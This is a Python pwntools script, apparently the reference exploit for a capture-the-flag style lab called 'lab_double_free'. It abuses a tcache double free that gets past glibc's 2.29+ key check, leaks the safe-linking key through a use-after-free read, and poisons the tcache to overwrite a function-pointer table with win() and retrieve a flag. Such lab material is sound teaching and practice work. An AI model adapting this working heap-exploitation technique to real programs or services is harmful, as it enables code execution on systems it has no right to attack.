#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""lab_double_free —— tcache double free（绕 2.29+ key 检测）参考 exploit

漏洞链：
  secure_free() 在 free 前 memset(ptr, 0, size) → 把 tcache_entry.key 清掉
  → free(0); free(1); free(0) 三次都能通过 tcache 的双 free 检测。
  del 不清空 slots[] → show() 能读已释放 chunk 的前 8 字节，泄漏 safe-linking 页号。

利用：
  tcache[0x50] = c0 -> c1 -> c0（环）
  add(2, p64(handlers ^ page))  # 取走 c0，同时改写它（环里会再出现）的 next
  add(3)                        # c1
  add(4)                        # c0 第二次；tcache 头被读成 handlers
  add(5, p64(win))              # malloc 返回 &handlers -> handlers[0] = win
  trigger(0)

用法：
    cd labs/lab_double_free
    make
    printf '__PWNED__{dfree_ok}\\n' > flag.txt
    python exp.py
    HOST=127.0.0.1 PORT=9999 python exp.py     # 远程（socat 起服务）
"""
import os
import sys

from pwn import *

context.arch = "amd64"
context.log_level = "info"

BIN = "./chal"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
SZ = 0x40  # 请求 0x40 → chunk 0x50


def start():
    if HOST:
        return remote(HOST, PORT)
    return process(BIN)


def add(p, idx, size, data):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)


def free(p, idx):
    p.sendlineafter(b"choice: ", b"3")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.recvuntil(b"done")


def show(p, idx, n):
    p.sendlineafter(b"choice: ", b"2")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.recvuntil(b"data: ")
    out = p.recvn(n)
    p.recvline()
    return out


def trigger(p, idx):
    p.sendlineafter(b"choice: ", b"4")
    p.sendlineafter(b"index: ", str(idx).encode())


def exploit():
    e = ELF(BIN, checksec=False)
    handlers = e.symbols["handlers"]
    win = e.symbols["win"]
    log.info("handlers = %#x, win = %#x", handlers, win)

    p = start()

    # 1) 两个同 size chunk；del(0) 后 tcache 里只有 c0 → c0->next = 0 ^ (c0>>12)
    add(p, 0, SZ, b"A" * SZ)
    add(p, 1, SZ, b"B" * SZ)
    free(p, 0)
    page = u64(show(p, 0, 8))            # safe-linking 混淆 key：c0 >> 12
    log.success("safe-linking page key = %#x", page)

    # 2) del(1) → c1 -> c0；再 del(0)：memset 已把 key 清零，检测失效 → c0 -> c1 -> c0
    free(p, 1)
    free(p, 0)

    # 3) 取走 c0 时顺手改它的 next（环里 c0 还会再出现一次，那次取就用到这里写的值）
    add(p, 2, SZ, p64(handlers ^ page).ljust(SZ, b"\x00"))
    add(p, 3, SZ, b"C" * SZ)             # c1
    add(p, 4, SZ, b"D" * SZ)             # c0 第二次；取完 tcache 头 = handlers
    add(p, 5, SZ, p64(win).ljust(SZ, b"\x00"))   # malloc 返回 &handlers

    trigger(p, 0)
    p.recvuntil(b"here is your flag:")
    return p.recvall(timeout=5)


if __name__ == "__main__":
    out = exploit()
    sys.stdout.buffer.write(out)
    sys.stdout.write("\n" if not out.endswith(b"\n") else "")
    if b"__PWNED__" not in out:
        raise SystemExit("[-] 没拿到 flag，检查 labs/lab_double_free/flag.txt")
    log.success("double free (tcache) OK")
